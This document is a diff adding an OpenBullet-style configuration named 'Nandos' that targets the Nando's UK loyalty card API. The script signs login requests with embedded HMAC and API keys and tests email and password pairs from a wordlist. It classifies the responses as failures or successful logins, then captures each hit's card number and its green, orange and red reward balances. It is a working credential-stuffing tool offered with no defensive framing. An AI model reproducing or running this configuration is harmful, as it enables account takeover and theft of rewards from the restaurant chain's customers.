@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Nandos",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-01T21:11:32.6548297+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION HMAC SHA256 "1c50cf1b7315343495189c676266424cf9f150c5d4567004dbf4ca62bf5b9518" "{\"method\":\"api_validate\",\"params\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" -> VAR "Hash" 
+REQUEST POST "https://www.nandos.co.uk/js/nandoscard_json_api/call" 
+  CONTENT "request=%7B%22method%22%3A%22api_validate%22%2C%22params%22%3A%7B%22email%22%3A%22<USER>%22%2C%22password%22%3A%22<PASS>%22%7D%7D&signature=<HASH>&key=297dc12bfe1b2c44a6d081e343e3faeb8a07660e1dffbd69002eb9fd0db634e5" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 ( compatible )" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "version: nandos.android.app" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "executionStatusDescription\":\"user_info.not_found" 
+    KEY "executionStatusDescription\":\"Your password must be at least 8 characters in length, contain at least one lowercase letter, one uppercase letter and one number" 
+    KEY "executionStatusDescription\":\"Password must be 8 or more characters long" 
+  KEYCHAIN Success OR 
+    KEY "cardNumber\":\"" 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\",\"howHot" -> CAP "Card Number" 
+FUNCTION HMAC SHA256 "1c50cf1b7315343495189c676266424cf9f150c5d4567004dbf4ca62bf5b9518" "{\"method\":\"api_bonus_plan\",\"params\":{\"card_number\":\"<Card Number>\",\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" -> VAR "hash2" 
+REQUEST POST "https://www.nandos.co.uk/js/nandoscard_json_api/call" 
+  CONTENT "request=%7B%22method%22%3A%22api_bonus_plan%22%2C%22params%22%3A%7B%22card_number%22%3A%22<Card Number>%22%2C%22email%22%3A%22<USER>%22%2C%22password%22%3A%22<PASS>%22%7D%7D&signature=<hash2>&key=297dc12bfe1b2c44a6d081e343e3faeb8a07660e1dffbd69002eb9fd0db634e5" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 ( compatible )" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "version: nandos.android.app" 
+PARSE "<SOURCE>" LR "mild_rewards\":" ",\"med_rewards" -> CAP "Green Rewards : " 
+PARSE "<SOURCE>" LR "med_rewards\":" ",\"hot_rewards" -> CAP "Orange Rewards : " 
+PARSE "<SOURCE>" LR "hot_rewards\":" ",\"wheel_position" -> CAP "Red Rewards : " 
